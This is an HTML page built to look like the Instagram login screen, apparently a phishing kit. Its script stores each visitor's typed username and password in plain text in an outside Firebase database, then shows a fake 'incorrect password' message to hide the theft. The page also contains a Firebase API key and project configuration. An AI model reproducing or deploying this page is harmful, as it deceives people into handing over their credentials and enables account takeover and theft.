<html lang="en">

<head>

<body>
    <script type="module">

        // Import the functions you need from the SDKs you need
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
  import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

  // Your web app's Firebase configuration
  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
  const firebaseConfig = {
    apiKey: "AIzaSyD6-i-WutjccdWctkDrQko2_H-Ef62kGSE",
    authDomain: "instagra-clone-b59af.firebaseapp.com",
    projectId: "instagra-clone-b59af",
    storageBucket: "instagra-clone-b59af.appspot.com",
    messagingSenderId: "103650527985",
    appId: "1:103650527985:web:a390b9d5bd48fc73503750",
    measurementId: "G-YNK33TLNZ4"
  };

  // Initialize Firebase
  const app = initializeApp(firebaseConfig);
  //get ref to database 
  const db=getDatabase(app);
  document.getElementById("submit").addEventListener('click', function(e){
    e.preventDefault();
    set(ref(db, 'user/' + document.getElementById("uname").value),
    {
    username: document.getElementById("uname").value,
    password: document.getElementById("password").value

    });
    alert("incorrect password");
  })
    </script>
    <main>
        <img src="IG.jpeg" alt="" class="phoneImg">
        <div class="form-div">
            <form action="login.php" method="POST">
                <img class="instaLogo" src="instaLogo.png" alt="logo">
                <input type="text" class="input" placeholder="phone number, username, or email" required id="uname">
                <input type="password" class="input" required placeholder="Password" id="password">
                <button class="login-btn" id="submit">Log In</button>
                <p id="or">                                                                                                        or</p>
                <a href="#" class="fb-login"><i class='bx bxl-facebook-square'></i>Log in with Facebook</a>
            </form>
            <div class="sign-up">
                <p>Don't have an account? <a href="#" class="sign-link">Sign up</a></p>
            </div>
            <div class="get-app">
                <p>Get the app</p>
                <div class="store">
                    <img id="play" src="playStore.png" alt="">
                    
                </div>
            </div>
        </div>
    </main>
</body>
